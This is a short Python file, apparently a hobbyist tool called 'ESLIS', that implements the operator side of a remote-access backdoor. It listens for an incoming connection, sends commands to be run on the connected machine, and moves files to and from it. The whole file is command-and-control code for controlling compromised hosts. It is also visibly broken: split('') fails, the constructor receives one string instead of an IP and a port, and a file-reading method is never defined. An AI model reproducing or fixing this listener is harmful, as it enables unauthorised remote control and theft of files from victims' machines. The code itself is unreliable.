'''
This tool has developed by ErWin

the ESLIS is a product to fill the role of a socket listener.

'''



import socket
import json
import base64
import os
import time
from typing_extensions import Self



ip = "ip.ip.ip.ip"
port = "1234"

# Classing SocketListener

class SocketListener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening...")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection  Completed from" + str(my_address))
        
        
  
    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)
        
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
                
               
               
    def command_execution(self, command_input):
        self.json_send(command_input)
        
        
        
        if command_input[0] == "quit":
         self.my_connection.close()
         exit()
           
        return self.json_receive()
       
    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            
            return "Download Completed"
            
    def start_listener(self):
        while True:
            command_input = raw_input("Enter Command: ")
            command_input = command_input.split("")
            
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)
                command_output = self.command_execution(command_input)
                
                
                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1], command_output)
            except Exception:
                command_output = "Error!"
            print(command_output)
            
            
my_socket_listener = SocketListener("10.0.2.15, 8080")
my_socket_listener.start_listener()